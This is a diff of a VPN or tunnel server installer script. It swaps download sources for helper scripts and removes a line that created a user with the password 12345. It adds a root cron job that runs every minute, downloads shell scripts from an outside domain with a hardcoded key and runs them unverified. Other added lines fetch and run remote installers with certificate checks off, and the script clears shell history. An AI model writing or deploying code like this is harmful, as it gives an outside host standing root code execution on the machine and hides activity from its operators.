@@ -861,13 +861,11 @@ llJ5x8d1nZT7CWpogTTvqDdK6iiKPb/+
 EOM
 
 
-wget -O dnstts.sh "https://raw.githubusercontent.com/johnberic/ubuntu_ovpnws/main/dnstts.sh"
+wget -O dnstts.sh "https://raw.githubusercontent.com/johnberic/5ginternet/main/dnstts.sh"
 chmod +x ~/dnstts.sh && sed -i -e 's/\r$//' ~/dnstts.sh && ./dnstts.sh
 
+wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/johnberic/nana/main/hysteriav1.sh; chmod +x ~/install_server.sh; ./install_server.sh --version v1.3.5
 
-
-wget -O hysteriav1.sh "admin-boyes.com/tkapi/hysteriav1.sh"
-chmod +x ~/hysteriav1.sh && sed -i -e 's/\r$//' ~/hysteriav1.sh && ./hysteriav1.sh
 
 rm -f /etc/hysteria/config.json
 
@@ -1180,9 +1178,34 @@ iptables-save > /etc/iptables_rules.v4
 ip6tables-save > /etc/iptables_rules.v6
 cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
 update-rc.d squid enable
- /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulaan
+
 sudo apt-get autoremove -y > /dev/null 2>&1
 sudo apt-get clean > /dev/null 2>&1
+
+
+
+API_LINK='5ginternetvip.com/api/authentication';
+API_KEY='Tknetwork';
+
+cat <<EOF >/home/authentication.sh
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
+sleep 5
+wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+sleep 5
+wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+sleep 15
+bash /home/active.sh
+sleep 15
+bash /home/inactive.sh
+sleep 15
+bash /home/deleted.sh
+EOF
+
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+
 history -c
 cd /root || exit
 
